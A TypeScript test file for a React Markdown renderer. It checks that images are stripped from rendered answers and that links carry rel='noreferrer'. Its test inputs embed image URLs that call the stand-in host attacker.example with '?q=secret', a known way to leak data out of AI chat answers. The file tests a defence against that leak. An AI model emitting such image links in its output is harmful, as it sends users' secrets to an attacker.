import assert from "node:assert/strict";
import { test } from "node:test";
import { renderToStaticMarkup } from "react-dom/server";

import { AnswerMarkdown } from "./answerMarkdown";

const render = (text: string) => renderToStaticMarkup(<AnswerMarkdown>{text}</AnswerMarkdown>);

test("drops Markdown images so no outside URL is fetched", () => {
  const html = render("Answer ![](https://attacker.example/?q=secret) done");
  assert.doesNotMatch(html, /<img/);
  assert.doesNotMatch(html, /attacker\.example/);
});

test("drops reference-style images", () => {
  const html = render("![x][1]\n\n[1]: https://attacker.example/?q=secret");
  assert.doesNotMatch(html, /<img/);
  assert.doesNotMatch(html, /attacker\.example/);
});

test("drops raw HTML images", () => {
  const html = render('<img src="https://attacker.example/?q=secret">');
  assert.doesNotMatch(html, /<img/);
  assert.doesNotMatch(html, /attacker\.example/);
});

test("links do not send a Referer", () => {
  const html = render("[docs](https://example.com/page)");
  assert.match(html, /<a href="https:\/\/example.com\/page" rel="noreferrer">docs<\/a>/);
});
